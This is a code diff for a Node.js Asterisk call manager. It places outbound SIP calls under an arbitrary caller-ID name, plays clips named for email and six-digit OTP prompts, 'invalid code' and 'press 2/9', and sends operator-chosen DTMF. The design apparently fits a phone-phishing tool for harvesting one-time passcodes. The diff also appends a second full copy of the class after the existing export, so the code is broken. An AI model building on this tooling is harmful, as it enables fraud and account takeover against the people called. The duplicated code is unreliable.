@@ -744,3 +744,254 @@ class InteractiveCallManager extends EventEmitter {
 }
 
 module.exports = { InteractiveCallManager };
+const EventEmitter = require('events');
+const { initializeAMI, getAMI } = require('./asterisk/instance');
+const config = require('./config');
+const fs = require('fs');
+const path = require('path');
+
+class InteractiveCallManager extends EventEmitter {
+  constructor() {
+    super();
+    this.ami = null;
+    this.connected = false;
+    this.activeCalls = new Map();
+    this.callCounter = 0;
+  }
+
+  async initialize() {
+    try {
+      this.ami = await initializeAMI();
+      this.connected = true;
+      console.log('✅ Interactive Call Manager initialized');
+    } catch (error) {
+      console.error('❌ Failed to initialize Interactive Call Manager:', error);
+      // Continue without AMI for development
+      this.connected = false;
+    }
+  }
+
+  async initiateCall(phoneNumber, name = 'Unknown') {
+    const callId = `call_${++this.callCounter}_${Date.now()}`;
+    
+    // Store call data
+    this.activeCalls.set(callId, {
+      phoneNumber,
+      name,
+      status: 'initiating',
+      startTime: new Date(),
+      ttsRecordings: {}
+    });
+
+    try {
+      // Clean phone number
+      const cleanPhone = phoneNumber.replace(/[^\d+]/g, '');
+      
+      console.log(`Initiating call to ${cleanPhone} (Name: ${name})`);
+      
+      if (this.connected) {
+        const sipChannel = `SIP/${config.sip.username}/${cleanPhone}`;
+        const actionId = `call-${cleanPhone}-${Date.now()}`;
+        
+        console.log(`Using SIP channel: ${sipChannel}`);
+        
+        const response = await this.ami.action({
+          action: 'Originate',
+          channel: sipChannel,
+          context: 'call-flow',
+          exten: 'start', 
+          priority: 1,
+          actionid: actionId,
+          CallerID: `"${name}" <${config.sip.username}>`,
+          variable: `CALL_ID=${callId},PHONE_NUMBER=${cleanPhone},NAME=${name.replace(/,/g, '_')}`,
+          timeout: 30000,
+          async: true
+        });
+
+        console.log('✅ Call origination response:', response);
+      } else {
+        console.log('⚠️ AMI not connected, simulating call initiation');
+        // Simulate call for development
+        setTimeout(() => {
+          this.emit('callAnswered', callId, 'simulated');
+        }, 2000);
+      }
+
+      return callId;
+    } catch (error) {
+      console.error('❌ Error initiating call:', error);
+      this.activeCalls.delete(callId);
+      throw error;
+    }
+  }
+
+  async uploadAudioForCall(callId, audioPath) {
+    if (!this.activeCalls.has(callId)) {
+      throw new Error(`Call ${callId} not found`);
+    }
+
+    const callData = this.activeCalls.get(callId);
+    callData.uploadedAudio = audioPath;
+    callData.status = 'audio_uploaded';
+    
+    this.activeCalls.set(callId, callData);
+    
+    console.log(`✅ Audio uploaded for call ${callId}: ${audioPath}`);
+    this.emit('callUpdated', callId, 'Audio uploaded');
+    
+    return { success: true, audioPath };
+  }
+
+  async playAudioToCall(callId, audioType) {
+    if (!this.activeCalls.has(callId)) {
+      throw new Error(`Call ${callId} not found`);
+    }
+
+    console.log(`🎵 Playing ${audioType} audio for call ${callId}`);
+    
+    // Map audio types to files
+    const audioFiles = {
+      'email': 'email6.mp3',
+      'otp6': 'otp6.mp3',
+      'invalidcode': 'invalidcode.mp3',
+      'press2': 'press2.mp3',
+      'press9': 'press9.mp3',
+      'invalid': 'invalidcode.mp3'
+    };
+
+    const audioFile = audioFiles[audioType];
+    if (!audioFile) {
+      throw new Error(`Unknown audio type: ${audioType}`);
+    }
+
+    if (this.connected) {
+      try {
+        const response = await this.ami.action({
+          action: 'PlayFile',
+          channel: `SIP/${config.sip.username}-${callId}`,
+          file: audioFile.replace('.mp3', ''),
+          actionid: `play-${callId}-${Date.now()}`
+        });
+        console.log(`✅ Audio play response:`, response);
+      } catch (error) {
+        console.log(`⚠️ Could not play audio via AMI, simulating: ${error.message}`);
+      }
+    } else {
+      console.log(`⚠️ AMI not connected, simulating audio play: ${audioFile}`);
+    }
+
+    this.emit('callUpdated', callId, `Playing ${audioType} audio`);
+    return { success: true, audioType, file: audioFile };
+  }
+
+  async playTTSMessage(callId, message) {
+    if (!this.activeCalls.has(callId)) {
+      throw new Error(`Call ${callId} not found`);
+    }
+
+    console.log(`🗣️ Playing TTS message for call ${callId}: "${message}"`);
+    
+    if (this.connected) {
+      try {
+        const response = await this.ami.action({
+          action: 'SendText',
+          channel: `SIP/${config.sip.username}-${callId}`,
+          message: message,
+          actionid: `tts-${callId}-${Date.now()}`
+        });
+        console.log(`✅ TTS response:`, response);
+      } catch (error) {
+        console.log(`⚠️ Could not send TTS via AMI, simulating: ${error.message}`);
+      }
+    } else {
+      console.log(`⚠️ AMI not connected, simulating TTS play`);
+    }
+
+    this.emit('callUpdated', callId, `Playing TTS: ${message}`);
+    return { success: true, message };
+  }
+
+  async sendManualDTMF(callId, digit) {
+    if (!this.activeCalls.has(callId)) {
+      throw new Error(`Call ${callId} not found`);
+    }
+
+    console.log(`🔢 Sending manual DTMF ${digit} for call ${callId}`);
+    
+    if (this.connected) {
+      try {
+        const response = await this.ami.action({
+          action: 'SendDTMF',
+          channel: `SIP/${config.sip.username}-${callId}`,
+          digit: digit,
+          actionid: `dtmf-${callId}-${Date.now()}`
+        });
+        console.log(`✅ DTMF send response:`, response);
+      } catch (error) {
+        console.log(`⚠️ Could not send DTMF via AMI, simulating: ${error.message}`);
+      }
+    } else {
+      console.log(`⚠️ AMI not connected, simulating DTMF send`);
+    }
+
+    this.emit('callUpdated', callId, `Manual DTMF sent: ${digit}`);
+    return { success: true, digit, message: `DTMF ${digit} sent successfully` };
+  }
+
+  async showDTMFOptions(callId) {
+    console.log(`🔢 Showing DTMF options for call ${callId}`);
+    this.emit('showDTMFOptions', callId);
+    return { success: true };
+  }
+
+  async getCallStatus(callId) {
+    if (!this.activeCalls.has(callId)) {
+      throw new Error(`Call ${callId} not found`);
+    }
+    return this.activeCalls.get(callId);
+  }
+
+  async getActiveCalls() {
+    return Array.from(this.activeCalls.entries());
+  }
+
+  async endCall(callId) {
+    if (!this.activeCalls.has(callId)) {
+      throw new Error(`Call ${callId} not found`);
+    }
+
+    console.log(`📴 Ending call ${callId}`);
+    
+    if (this.connected) {
+      try {
+        const response = await this.ami.action({
+          action: 'Hangup',
+          channel: `SIP/${config.sip.username}-${callId}`,
+          actionid: `hangup-${callId}-${Date.now()}`
+        });
+        console.log(`✅ Hangup response:`, response);
+      } catch (error) {
+        console.log(`⚠️ Could not hangup via AMI, simulating: ${error.message}`);
+      }
+    }
+
+    this.activeCalls.delete(callId);
+    this.emit('callEnded', callId);
+    return { success: true };
+  }
+
+  async setupTTSRecordings(callId, recordings) {
+    if (!this.activeCalls.has(callId)) {
+      throw new Error(`Call ${callId} not found`);
+    }
+
+    const callData = this.activeCalls.get(callId);
+    callData.ttsRecordings = recordings;
+    this.activeCalls.set(callId, callData);
+    
+    console.log(`✅ TTS recordings setup for call ${callId}`);
+    return { success: true };
+  }
+}
+
+module.exports = { InteractiveCallManager };
